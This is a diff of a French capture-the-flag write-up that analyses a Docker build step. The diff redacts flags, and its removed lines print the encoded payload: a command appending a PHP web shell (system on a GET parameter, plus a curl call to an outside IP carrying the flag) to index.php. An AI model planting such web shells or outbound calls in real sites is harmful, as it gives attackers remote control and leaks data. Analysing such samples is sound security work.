@@ -114,7 +114,7 @@ Là, on trouve quelque chose d’intéressant. En analysant l’étape 17 du Doc
 
 
 ```bash
-/ bin/sh -c echo $(echo "PD9waHAgc3lzdGVtKCRfR0VUW2Jhc2U2NF9kZWNvZGUoJ2NIZHVaV1E9JyldKTtzaGVsbF9leGVjKGJhc2U2NF9kZWNvZGUoJ1kzVnliQ0F0TFhWelpYSXRZV2RsYm5RZ0oxSk5lM1JJTVhOZmN6Tnlkak5TWHpGelgzQlhiak5rZlNjZ2FIUjBjRG92THpFNU9DNDFNUzR4TURBdU5ESXYnKSk7Pz4=" | base64 -d) >> index.php
+/ bin/sh -c echo $(echo "[FLAG CACHÉ]" | base64 -d) >> index.php
 ```
 
 
@@ -123,7 +123,7 @@ En décodant cette chaîne, on obtient une commande PHP qui ressemble à ceci :
 
 
 ```php
-<?php system($_GET[base64_decode('cHduZWQ=')]);shell_exec(base64_decode('Y3VybCAtLXVzZXItYWdlbnQgJ1JNe3RIMXNfczNydjNSXzFzX3BXbjNkfScgaHR0cDovLzE5OC41MS4xMDAuNDIv'));?>
+<?php system($_GET[base64_decode('cHduZWQ=')]);shell_exec(base64_decode('[FLAG CACHÉ]'));?>
 ```
 
 
@@ -153,7 +153,7 @@ pwned
 
 
 ```bash
-$ echo "Y3VybCAtLXVzZXItYWdlbnQgJ1JNe3RIMXNfczNydjNSXzFzX3BXbjNkfScgaHR0cDovLzE5OC41MS4xMDAuNDIv" | base64 -d
+$ echo "[FLAG CACHÉ]" | base64 -d
 curl --user-agent 'REDACTED' http://198.51.100.42/
 ```
 
